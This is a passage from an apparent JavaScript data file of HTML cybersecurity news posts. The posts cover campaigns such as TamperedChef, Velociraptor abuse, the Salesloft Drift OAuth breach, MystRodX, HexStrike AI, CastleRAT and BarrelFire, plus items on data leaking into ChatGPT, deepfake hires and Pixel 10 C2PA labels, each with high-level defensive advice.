        <li>📦 Fake installer deploys TamperedChef in the background</li>
        <li>🕒 Malware stays dormant for weeks to avoid suspicion</li>
        <li>🔑 Once active, it steals <b>credentials, cookies, and browser data</b></li>
        <li>💻 Installs a <b>backdoor</b> for persistent access to the system</li>
      </ul>
      <p>
        This staged approach allows the malware to bypass short-term scans and sandbox analysis, 
        striking only after the victim has lowered their guard.
      </p>
    </section><br>

    <section style="padding:20px; background:linear-gradient(135deg,#134e4a,#0f766e); border-radius:12px; color:#f0fdfa; margin-top:15px;">
      <h3 style="color:#34d399;">🚨 Why It’s a Serious Threat</h3><br>
      <p>
        By targeting users through <b>Google Ads</b>, attackers ensured massive reach and a 
        high level of credibility. Many victims likely believed they were downloading a trusted tool. 
        The <b>delayed activation</b> made detection even harder, as most malware defenses 
        only monitor initial execution windows.
      </p>
      <p>
        With credentials stolen, attackers can access bank accounts, business portals, and 
        personal data — while the backdoor gives them the ability to re-enter systems at will.
      </p>
    </section><br>

    <section style="padding:20px; background:#f8f9fa; border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#2563eb;">🛡️ Defense Measures</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>✔️ Avoid downloading software via ads — use official vendor websites</li>
        <li>✔️ Use <b>behavior-based detection</b> to catch delayed malware activity</li>
        <li>✔️ Monitor for unusual logins and cookie/session hijacking attempts</li>
        <li>✔️ Regularly patch browsers and disable untrusted extensions</li>
        <li>✔️ Run threat-hunting queries for dormant processes and backdoor artifacts</li>
      </ul>
    </section><br>

    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#1e293b,#111827); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#ef4444;">✅ Final Thoughts</h3><br>
      <p>
        <b>TamperedChef</b> proves that malware doesn’t need to strike instantly to be effective. 
        By waiting weeks before stealing data, it evades defenses and builds victim trust. 
        Users and organizations alike must rethink software download habits and adopt 
        layered defenses to outpace these stealthy campaigns.
      </p>
    </section>
  `},{id:"velociraptor-abuse-teams-phishing-2025",title:"When Trusted Tools Turn Rogue: Velociraptor Abuse & Fake IT Teams Chats",summary:"Attackers weaponize a legitimate forensic tool and impersonate IT staff to steal credentials.",date:"2025-09-01",author:"EthicalByte",tags:["Velociraptor","Malware","Microsoft Teams","Phishing","Forensic Tools"],imageKey:"velociraptorAbuseBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#111827,#1e293b); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#ef4444;">🚨 Trusted Tools, Twisted Purposes</h3><br>
      <p>
        Attackers are now abusing <b>Velociraptor</b>, a legitimate open-source forensic tool, to sneak into enterprise 
        networks. At the same time, they’re launching <b>fake IT support chats</b> on <b>Microsoft Teams</b> — 
        tricking employees into handing over credentials or installing malware.  
      </p>
      <p>
        This dual-pronged campaign shows a dangerous shift: adversaries are moving away from sketchy tools and 
        toward <b>trusted platforms</b> to gain persistence and credibility inside organizations.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1e293b,#334155); border-radius:12px; color:#e2e8f0; margin-top:15px;">
     <br> <h3 style="color:#facc15;">⚙️ How the Attack Works</h3><br>
      <p>
        <b>Step 1:</b> Velociraptor, normally used for forensic investigations, is deployed by attackers to quietly collect 
        system data and map the environment.  
      </p>
      <p>
        <b>Step 2:</b> Employees receive what appears to be a legitimate <b>IT support message</b> in Microsoft Teams. 
        The attackers impersonate internal staff, claiming “system updates” or “security fixes” are needed.  
      </p>
      <p>
        <b>Step 3:</b> Victims are tricked into sharing login credentials or downloading malware disguised as updates, 
        giving attackers direct access to critical accounts and systems.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#0f766e,#134e4a); border-radius:12px; color:#f0fdfa; margin-top:15px;">
    <br>  <h3 style="color:#34d399;">🚨 Why It’s Dangerous</h3><br>
      <p>
        By abusing Velociraptor, attackers gain <b>legitimate visibility</b> into endpoints — the same way defenders do. 
        Combined with phishing inside a trusted collaboration platform like Teams, detection becomes much harder.  
      </p>
      <p>
        Traditional defenses rarely flag these moves, since both the forensic tool and Teams are seen as 
        “safe” by default. This lets adversaries operate <b>under the radar</b> while quietly escalating privileges.
      </p>
    </section>

    <section style="padding:20px; background:#f8f9fa; border-radius:12px; color:#333; margin-top:15px;">
     <br> <h3 style="color:#2563eb;">🛡️ Defense Measures</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>✔️ Audit and restrict use of admin/forensic tools like Velociraptor</li>
        <li>✔️ Monitor Teams chats for suspicious impersonation attempts</li>
        <li>✔️ Use strong MFA to reduce risk of stolen credentials</li>
        <li>✔️ Train employees to verify IT requests through official channels</li>
        <li>✔️ Deploy behavioral analytics to flag abnormal data collection</li>
      </ul>
    </section>

    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#1e293b,#111827); border-radius:12px; color:#f5f5f5; margin-top:15px;">
     <br> <h3 style="color:#ef4444;">✅ Final Thoughts</h3><br>
      <p>
        The abuse of <b>Velociraptor</b> and impersonation on <b>Microsoft Teams</b> prove a key reality: 
        even trusted tools and platforms can become attack vectors in the wrong hands.  
        Organizations must treat every login, chat, and tool invocation as potential risk — and 
        secure both human and technical trust boundaries before adversaries exploit them.  
      </p>
    </section>
  `},{id:"zscaler-salesloft-drift-breach-2025",title:"Zscaler Caught in Salesloft Drift OAuth Breach",summary:"Attackers accessed Salesforce data, exposing customer contacts, licensing info, and case details.",date:"2025-09-02",author:"EthicalByte",tags:["Zscaler","Salesloft","OAuth Breach","Supply Chain Attack","Salesforce"],imageKey:"zscalerSalesloftBreachBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#111827,#1e293b); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#ef4444;">🚨 The Breach Update</h3><br>
      <p>
        Security firm <b>Zscaler</b> has confirmed it is the latest victim of the ongoing <b>Salesloft Drift OAuth breach</b>. 
        Attackers gained access to its <b>Salesforce instance</b>, exfiltrating <b>customer contact information</b>, 
        <b>licensing details</b>, and portions of <b>support case text</b>.  
      </p>
      <p>
        While Zscaler reports <b>no evidence of misuse</b> so far, the fact that trusted SaaS integrations can lead to 
        this kind of exposure highlights the fragility of the <b>cloud supply chain</b>.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1e293b,#334155); border-radius:12px; color:#e2e8f0; margin-top:15px;">
      <h3 style="color:#facc15;">⚙️ How the Attack Worked</h3><br>
      <p>
        The breach is tied to the earlier compromise of <b>Salesloft Drift OAuth tokens</b>, which granted unauthorized 
        access to integrated apps. For Zscaler, this meant attackers could pull data directly from Salesforce without 
        needing to breach the company’s own systems.  
      </p>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>🔑 OAuth tokens abused for seamless access</li>
        <li>📂 Customer & licensing data exfiltrated</li>
        <li>📝 Support case text partially exposed</li>
        <li>🚫 No direct breach of Zscaler’s core systems</li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#0f766e,#134e4a); border-radius:12px; color:#f0fdfa; margin-top:15px;">
      <h3 style="color:#34d399;">🚨 Why It Matters</h3><br>
      <p>
        This isn’t just about Zscaler — it’s about the risks of <b>OAuth-based trust chains</b>. 
        Attackers no longer need to breach your firewall or servers; compromising a third-party app 
        integrated with your systems can yield the same access.  
      </p>
      <p>
        With more organizations connecting SaaS platforms for workflows, <b>identity and integration 
        security</b> is becoming just as critical as endpoint and network defense.
      </p>
    </section>

    <section style="padding:20px; background:#f8f9fa; border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#2563eb;">🛡️ Response & Defense</h3><br>
      <p>
        Zscaler responded by <b>revoking unauthorized access</b> and <b>rotating all affected tokens</b>. 
        Customers have been notified, and additional monitoring is in place.  
      </p>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>✔️ Review SaaS integrations and OAuth permissions</li>
        <li>✔️ Rotate credentials and tokens regularly</li>
        <li>✔️ Enforce least-privilege for API and app access</li>
        <li>✔️ Monitor for unusual access patterns in Salesforce & SaaS apps</li>
      </ul>
    </section>

    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#1e293b,#111827); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#ef4444;">✅ Final Thoughts</h3><br>
      <p>
        The Zscaler incident proves a critical point: <b>OAuth token abuse is the new attack vector</b>. 
        Defenders must treat third-party SaaS connections with the same scrutiny as external logins, 
        because one weak link in the trust chain can expose even the most security-conscious companies.
      </p>
    </section>
  `},{id:"mystrodx-backdoor-espionage-2025",title:"MystRodX: The Stealth Backdoor Built for Espionage",summary:"A secret-triggered malware linked to China’s Liminal Panda espionage group.",date:"2025-09-03",author:"EthicalByte",tags:["MystRodX","Backdoor","Espionage","APT","Liminal Panda"],imageKey:"mystrodxBackdoorBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#111827,#1e293b); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#ef4444;">💀 A Backdoor That Waits for the Ping</h3><br>
      <p>
        Security researchers have uncovered <b>MystRodX</b>, a stealthy backdoor designed for <b>long-term espionage operations</b>. 
        What makes it unique? It doesn’t constantly beacon to command-and-control servers. 
        Instead, MystRodX stays <b>silent and hidden</b> until it receives a carefully crafted <b>secret network ping</b>.  
      </p>
      <p>
        Once activated, it quietly opens the door for attackers to exfiltrate data, move laterally, 
        and manipulate systems without triggering early alerts.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1e293b,#334155); border-radius:12px; color:#e2e8f0; margin-top:15px;">
      <h3 style="color:#facc15;">⚙️ How MystRodX Works</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>🛠 Installs silently on compromised systems, blending in with normal processes</li>
        <li>🕒 Remains dormant until triggered via a <b>covert ping sequence</b></li>
        <li>📂 Once active, enables file theft, system manipulation, and persistence</li>
        <li>🧩 Uses <b>modular components</b> to adapt for espionage targets</li>
      </ul>
      <p>
        This “sleep-until-called” design minimizes detection, making it ideal for nation-state spying.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#0f766e,#134e4a); border-radius:12px; color:#f0fdfa; margin-top:15px;">
      <h3 style="color:#34d399;">🔍 Linked to Liminal Panda</h3><br>
      <p>
        Researchers have attributed MystRodX to <b>Liminal Panda</b>, a Chinese state-backed espionage group known 
        for targeting governments, defense contractors, and high-value enterprises.  
      </p>
      <p>
        The group is infamous for precision intrusions, stealthy persistence, and custom malware families 
        designed to <b>live off the land</b> and exploit trust boundaries.
      </p>
    </section>

    <section style="padding:20px; background:#f8f9fa; border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#2563eb;">🛡️ Why It Matters</h3><br>
      <p>
        MystRodX highlights the growing sophistication of <b>espionage-focused malware</b>. 
        Instead of noisy ransomware-style attacks, the goal is <b>long-term infiltration and intelligence gathering</b>. 
        Organizations often remain compromised for months before detection.
      </p>
      <p>
        This type of malware is especially dangerous for <b>governments, defense, finance, and research institutions</b>.
      </p>
    </section>

    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#1e293b,#111827); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#ef4444;">✅ Final Thoughts</h3><br>
      <p>
        <b>MystRodX</b> is not built for chaos — it’s built for control.  
        By staying dormant until the right moment, it shows how espionage actors are evolving 
        to stay invisible while extracting maximum value.  
        The takeaway? <b>Silence doesn’t mean safety</b>. Dormant threats may already be lurking in your network.
      </p>
    </section>
  `},{id:"hexstrike-ai-weaponized-2025",title:"HexStrike AI: From Ethical Hacking Tool to Weaponized Exploit Engine",summary:"Hackers are abusing HexStrike AI to exploit Citrix flaws at scale.",date:"2025-09-04",author:"EthicalByte",tags:["HexStrike AI","Citrix","Exploits","AI in Cybercrime","Vulnerability"],imageKey:"hexstrikeAiWeaponizedBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#111827,#1e293b); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#ef4444;">⚠ When Defense Tools Turn Against Us</h3><br>
      <p>
        <b>HexStrike AI</b>, a platform originally built for <b>ethical hacking and security testing</b>, 
        has now been co-opted by cybercriminals. Researchers confirm that attackers are already using it to 
        exploit <b>fresh Citrix vulnerabilities</b>, turning a defensive innovation into an offensive cyber weapon.  
      </p>
      <p>
        What was designed to <b>protect networks</b> is now fueling <b>real-world cyberattacks at scale</b>.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1e293b,#334155); border-radius:12px; color:#e2e8f0; margin-top:15px;">
      <h3 style="color:#facc15;">⚙ How HexStrike AI Is Being Misused</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>🔍 Originally designed for ethical vulnerability scanning</li>
        <li>💥 Adapted by hackers to <b>exploit zero-day and unpatched flaws</b></li>
        <li>📡 Current focus: <b>Citrix services</b>, already under active attack</li>
        <li>🚀 Automation via AI means exploits happen <b>faster and at larger scale</b></li>
      </ul>
      <p>
        This shift underscores how <b>dual-use AI tools</b> can blur the line between security and exploitation.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#0f766e,#134e4a); border-radius:12px; color:#f0fdfa; margin-top:15px;">
      <h3 style="color:#34d399;">🚨 Why It Matters</h3><br>
      <p>
        Citrix systems are widely deployed in <b>enterprises, governments, and critical infrastructure</b>. 
        With HexStrike AI automating the exploitation process, attackers can compromise targets at unprecedented speed.  
      </p>
      <p>
        This isn’t just a case of patched vs. unpatched — it’s about the <b>weaponization of AI security tools</b> 
        and the dangerous acceleration of the cyber threat lifecycle.
      </p>
    </section>

    <section style="padding:20px; background:#f8f9fa; border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#2563eb;">🛡 What Organizations Should Do</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>✔ Apply Citrix patches <b>immediately</b> — assume exploitation is already happening</li>
        <li>✔ Monitor for abnormal traffic patterns from Citrix environments</li>
        <li>✔ Restrict external exposure of Citrix services where possible</li>
        <li>✔ Audit the use of AI-driven pentesting tools in your environment</li>
        <li>✔ Prepare for AI-assisted threat actors becoming the norm</li>
      </ul>
    </section>

    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#1e293b,#111827); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#ef4444;">✅ Final Thoughts</h3><br>
      <p>
        <b>HexStrike AI</b> shows the double-edged nature of modern cybersecurity tools. 
        In the right hands, it’s a powerful defensive ally. In the wrong ones, it becomes an 
        <b>automated exploit engine</b>.  
        The takeaway is simple: <b>patch fast, monitor continuously, and plan for AI-driven adversaries</b>.
      </p>
    </section>
  `},{id:"genai-chatgpt-data-leak-2025",title:"Are Your Employees Leaking Secrets into ChatGPT?",summary:"Why most security tools can’t see GenAI traffic — and what that means for your data.",date:"2025-09-05",author:"EthicalByte",tags:["GenAI","ChatGPT","Data Loss Prevention","Insider Threat","AI Security"],imageKey:"genaiChatGPTLeakBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#111827,#1e293b); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#f87171;">🚨 Secrets Flowing Into ChatGPT</h3><br>
      <p>
        Right now, employees across industries may be pasting sensitive data — 
        <b>emails, files, API keys, intellectual property</b> — directly into <b>ChatGPT</b> 
        and other AI assistants. Once entered, this information leaves your environment 
        and enters an ecosystem that most <b>DLP (Data Loss Prevention) tools simply cannot see</b>.
      </p>
      <p>
        The result? An invisible insider threat channel where confidential business information 
        flows into AI systems beyond your control.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1e293b,#334155); border-radius:12px; color:#e2e8f0; margin-top:15px;">
      <h3 style="color:#fbbf24;">🔍 Why DLP Tools Fail</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>🔒 GenAI traffic is often encrypted and routed outside standard corporate monitoring</li>
        <li>🤖 Most DLP tools were never designed to parse AI-specific data flows</li>
        <li>📡 Shadow IT: employees use personal devices & browsers beyond corporate visibility</li>
        <li>🕵️ Insider risk: sensitive content can be exposed without malicious intent</li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#064e3b,#022c22); border-radius:12px; color:#d1fae5; margin-top:15px;">
      <h3 style="color:#34d399;">⚠️ Why This Matters</h3><br>
      <p>
        Generative AI introduces a <b>new blind spot</b> for enterprise security. 
        Unlike email or web uploads, AI interactions aren’t logged or monitored by default, 
        meaning critical intellectual property can leave the organization undetected.  
      </p>
      <p>
        In regulated industries like <b>finance, healthcare, and defense</b>, this creates 
        compliance and national security risks.
      </p>
    </section>

    <section style="padding:20px; background:#f8f9fa; border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#2563eb;">🛡️ Defensive Measures</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>✔️ Deploy GenAI-aware monitoring solutions</li>
        <li>✔️ Set policies for what data can/cannot be entered into AI tools</li>
        <li>✔️ Train employees on AI data risks</li>
        <li>✔️ Monitor browser and endpoint activity for unauthorized AI usage</li>
        <li>✔️ Explore proxy-based inspection of AI traffic flows</li>
      </ul>
    </section>

    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#1e293b,#111827); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#f87171;">✅ Final Thoughts</h3><br>
      <p>
        Generative AI is here to stay — but so is the risk of <b>accidental data exfiltration</b>.  
        If your security stack can’t see AI traffic, you’re already blind to one of the fastest-growing insider risks.  
        The fix isn’t blocking AI entirely, but <b>monitoring and governing its use responsibly</b>.
      </p>
    </section>
  `},{id:"castlerat-trojan-tag150-2025",title:"CastleRAT: TAG-150’s New Trojan Expands CastleLoader Operations",summary:"Python & C-based malware capable of stealing passwords, hijacking wallets, logging keys, and full PC takeover.",date:"2025-09-06",author:"EthicalByte",tags:["CastleRAT","TAG-150","Trojan","Malware","Cybercrime"],imageKey:"castleRATBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#0f172a,#1e293b); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#f87171;">🚨 Meet CastleRAT</h3><br>
      <p>
        A notorious cyber gang, <b>TAG-150</b>, has unveiled its latest weapon: <b>CastleRAT</b>, a 
        <b>Python & C-based trojan</b> engineered to expand their ongoing <b>CastleLoader operations</b>.  
        This new malware represents a dangerous step up in sophistication, combining multiple capabilities 
        into a single, powerful package.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1e293b,#334155); border-radius:12px; color:#e2e8f0; margin-top:15px;">
      <h3 style="color:#fbbf24;">⚙️ What CastleRAT Can Do</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>🔑 Steals saved <b>passwords</b> and credentials</li>
        <li>💰 Hijacks <b>cryptocurrency wallets</b></li>
        <li>⌨️ Logs <b>keystrokes</b> to capture sensitive input</li>
        <li>🖥️ Grants attackers <b>full remote control</b> over infected PCs</li>
      </ul>
      <p>
        Unlike one-dimensional malware, CastleRAT functions as an all-in-one espionage and theft tool — 
        maximizing attacker ROI per infection.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#064e3b,#022c22); border-radius:12px; color:#d1fae5; margin-top:15px;">
      <h3 style="color:#34d399;">🔍 Linked to CastleLoader Campaigns</h3><br>
      <p>
        CastleRAT is not a standalone threat — it integrates seamlessly with TAG-150’s <b>CastleLoader ecosystem</b>, 
        allowing rapid deployment and chaining of multiple malware families.  
      </p>
      <p>
        This tight integration suggests TAG-150 is scaling its infrastructure for <b>massive, sustained cybercrime operations</b>.
      </p>
    </section>

    <section style="padding:20px; background:#f8f9fa; border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#2563eb;">🛡️ Defense Against CastleRAT</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>✔️ Keep systems and apps patched to reduce initial infection vectors</li>
        <li>✔️ Deploy EDR solutions to detect trojan-like behaviors</li>
        <li>✔️ Monitor for unusual process injections and persistence attempts</li>
        <li>✔️ Train employees on phishing awareness — CastleLoader campaigns often start with malicious emails</li>
      </ul>
    </section>

    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#1e293b,#0f172a); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#f87171;">✅ Final Thoughts</h3><br>
      <p>
        With <b>CastleRAT</b>, TAG-150 proves its evolution from nuisance to a full-fledged cybercrime syndicate.  
        The malware’s ability to combine credential theft, crypto hijacking, and remote control makes it a 
        <b>serious threat to both individuals and enterprises</b>.  
        Defenders must recognize that today’s trojans are no longer simple — they’re multi-purpose weapons 
        embedded in larger, organized crime ecosystems.
      </p>
    </section>
  `},{id:"barrelfire-noisybear-kazakhstan-2025",title:"BarrelFire: Russia-Linked Hackers Breach Kazakhstan’s Energy Giant",summary:"NoisyBear group exploited stolen accounts to deliver malware and backdoors through fake IT emails.",date:"2025-09-08",author:"EthicalByte",tags:["BarrelFire","NoisyBear","KazMunaiGas","Energy Sector","Cyber Espionage","Russia-linked APT"],imageKey:"barrelFireBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#0f172a,#1e293b); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#f87171;">🚨 BarrelFire Targets KazMunaiGas</h3><br>
      <p>
        A <b>Russia-linked hacking group</b>, tracked as <b>NoisyBear</b>, has launched a sophisticated cyber operation 
        codenamed <b>BarrelFire</b> against Kazakhstan’s energy giant <b>KazMunaiGas</b>.  
        Attackers infiltrated the network using a <b>stolen employee account</b> to send 
        highly convincing <b>fake IT support emails</b> that contained booby-trapped ZIP files.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1e293b,#334155); border-radius:12px; color:#e2e8f0; margin-top:15px;">
      <h3 style="color:#fbbf24;">⚙ Attack Methodology</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>📧 Spear-phishing emails disguised as IT support messages</li>
        <li>📦 ZIP archives containing hidden malware payloads</li>
        <li>🕵 Delivered a <b>remote access trojan (RAT)</b> for persistence</li>
        <li>🔓 Established a <b>backdoor channel</b> for long-term espionage</li>
      </ul>
      <p>
        By leveraging a real employee’s compromised account, attackers bypassed trust barriers and 
        significantly increased the success rate of infection.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#064e3b,#022c22); border-radius:12px; color:#d1fae5; margin-top:15px;">
      <h3 style="color:#34d399;">🔍 Why This Matters</h3><br>
      <p>
        Targeting <b>critical energy infrastructure</b> highlights the growing risk of 
        <b>state-linked cyber operations</b> in geopolitically sensitive regions.  
        The use of stolen credentials also underlines a persistent weakness: 
        <b>human identity remains the weakest link</b> in enterprise defenses.
      </p>
    </section>

    <section style="padding:20px; background:#f8f9fa; border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#2563eb;">🛡 Defensive Measures</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>✔ Enforce strong <b>MFA</b> to prevent stolen account abuse</li>
        <li>✔ Monitor <b>internal email anomalies</b> for insider-like threats</li>
        <li>✔ Deploy <b>EDR solutions</b> for detecting RAT activity</li>
        <li>✔ Conduct regular phishing simulations for staff awareness</li>
      </ul>
    </section>

    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#1e293b,#0f172a); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#f87171;">✅ Final Thoughts</h3><br>
      <p>
        The BarrelFire operation shows how quickly a single stolen credential can escalate 
        into a <b>nation-state level cyber threat</b>.  
        For industries like energy, defense must go beyond firewalls — 
        it requires a proactive <b>identity-first security strategy</b>.
      </p>
    </section>
  `},{id:"ai-deepfake-fake-hires-2025",title:"AI-Powered Fake Hires: When Hackers Join Your Team",summary:"Deepfake candidates are slipping past interviews, getting onboarded, and stealing keys from the inside.",date:"2025-09-11",author:"EthicalByte",tags:["Insider Threat","Deepfake","AI Fraud","Recruitment Security","Cybersecurity"],imageKey:"fakeHireBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#3a0ca3,#7209b7); border-radius:12px; color:#f8f9fa;">
      <h3 style="color:#ffb703;">⚠ Hackers Aren’t Just Phishing — They’re Getting Hired</h3><br>
      <p>
        Cybercrime has entered the hiring process. Threat actors are now crafting <b>AI-generated resumes</b> and 
        using <b>deepfake video interviews</b> to infiltrate organizations. Unlike traditional phishing, these attacks 
        give adversaries <b>legitimate employee access</b> from day one. Once onboarded, they can quietly siphon off 
        <b>credentials, sensitive files, and even privileged keys</b> without raising alarms.
      </p>
      <p>
        This isn’t a “what if” scenario — it’s happening today, and companies that fail to recognize this new vector 
        risk <b>granting attackers the keys to their kingdom</b>.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#00b4d8,#0077b6); border-radius:12px; color:#e0f7fa; margin-top:15px;">
      <h3 style="color:#ffdd00;">🕵 How Fake Hires Work</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>📄 Hyper-polished <b>AI resumes</b> tailored to bypass HR filters</li>
        <li>🎥 <b>Deepfake interviewees</b> fool recruiters with realistic gestures & voices</li>
        <li>🔑 Successful candidates gain <b>system access, VPN credentials, and file shares</b></li>
        <li>🏃 After exfiltrating data or injecting malware, they vanish — leaving IT puzzled</li>
      </ul>
      <p>
        These aren’t isolated incidents. It’s a new <b>scalable model for insider threats</b>, 
        enabled by off-the-shelf AI tools.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#ff6f61,#d62828); border-radius:12px; color:#fff0f0; margin-top:15px;">
      <h3 style="color:#fff176;">🔍 Why This Is Different</h3><br>
      <p>
        Unlike malware or phishing emails that target the perimeter, fake hires bypass defenses by 
        <b>operating inside the network as trusted users</b>. Their actions blend in with legitimate activity, 
        making traditional monitoring tools blind to the threat. This marks a shift from external intrusion to 
        <b>internal compromise</b>, where the attacker already has what every hacker dreams of: valid credentials.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#fefae0,#faedcd); border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#d62828;">🛡 What Companies Must Do</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>✔ Apply <b>multi-layered identity verification</b> before and after hiring</li>
        <li>✔ Use <b>deepfake detection tools</b> during video interviews</li>
        <li>✔ Limit <b>system access</b> for new hires until trust is proven</li>
        <li>✔ Continuously <b>monitor behavioral anomalies</b> among employees</li>
      </ul>
      <p>
        Recruitment must now be treated with the same seriousness as endpoint security. Every hire is a potential 
        <b>attack surface</b>.
      </p>
    </section>

    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#03045e,#023e8a); border-radius:12px; color:#f1f1f1; margin-top:15px;">
      <h3 style="color:#ffb703;">✅ Final Thoughts</h3><br>
      <p>
        Hackers no longer need to <b>break in</b> — they can <b>walk in with a fake identity</b>.  
        As AI-powered deception grows, <b>identity becomes the new security perimeter</b>.  
        Companies that fail to adapt their hiring and monitoring processes are inviting adversaries 
        to join their payroll.
      </p>
    </section>
  `},{id:"google-pixel10-c2pa-2025",title:"Google Pixel 10 Adds Cryptographic Photo Labels",summary:"Pixel Camera becomes the first mobile device with top-rated C2PA authenticity tech",date:"2025-09-12",author:"EthicalByte",tags:["Google Pixel 10","C2PA","AI Authenticity","Deepfake Defense","Mobile Security"],imageKey:"pixel10C2PABanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#072f40,#0b5962); border-radius:12px; color:#f3fbfb;">
      <h3 style="color:#7be3ff;">📸 Photos With Cryptographic "Nutrition" Labels</h3><br>
      <p>
        Google’s new <b>Pixel 10</b> ships with built-in <b>C2PA</b> support: each photo can include a cryptographically signed provenance block — a compact "nutrition label" that records who created the image, what edits were applied, and whether AI tools were involved.
        This is a major step toward verifiable media: photographers, editors, platforms, and consumers can now trace an image’s lineage in a tamper-evident way.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#061826,#12343a); border-radius:12px; color:#e9fbff; margin-top:15px;">
      <h3 style="color:#9ff7ea;">🔐 Why This Matters</h3><br>
      <p>
        As generative AI increases the volume and realism of synthetic media, provenance becomes a practical defense. Cryptographic labels enable:
      </p>
      <ul style="margin-left:20px; line-height:1.7;">
        <li>✔️ Immediate verification of origin and edit history</li>
        <li>✔️ Clear flags when AI-assisted editing or generation was used</li>
        <li>✔️ Platform signals to help automated moderation and newsroom verification</li>
      </ul>
      <p>
        Pixel 10 reaching a top security rating for C2PA on a mobile device is a first — and it pushes the industry standard for authenticity on everyday devices.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#084c61,#0f6b78); border-radius:12px; color:#eafcff; margin-top:15px;">
      <h3 style="color:#c6fff5;">🔎 Technical Details (How It Works)</h3><br>
      <p>
        The camera app can generate a signed provenance manifest using device-bound keys. Key points:
      </p>
      <ul style="margin-left:20px; line-height:1.7;">
        <li>🔑 <b>Device attestation:</b> cryptographic keys anchored to the Pixel hardware sign the provenance metadata.</li>
        <li>🧾 <b>Provenance payload:</b> contains creator identity (optional), toolchain edits, timestamps, and flags for AI involvement per C2PA schemas.</li>
        <li>🔗 <b>Verification:</b> third parties can verify signatures against Google’s attestation service or via on-device checks.</li>
      </ul>
      <p>
        This model balances usability and security by embedding minimal, verifiable metadata that consumers and platforms can check quickly.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#0b2940,#123249); border-radius:12px; color:#e6fbff; margin-top:15px;">
      <h3 style="color:#a7fff1;">⚠️ Limitations & Privacy Considerations</h3><br>
      <p>
        C2PA labels improve transparency, but they aren’t a silver bullet. Key caveats:
      </p>
      <ul style="margin-left:20px; line-height:1.7;">
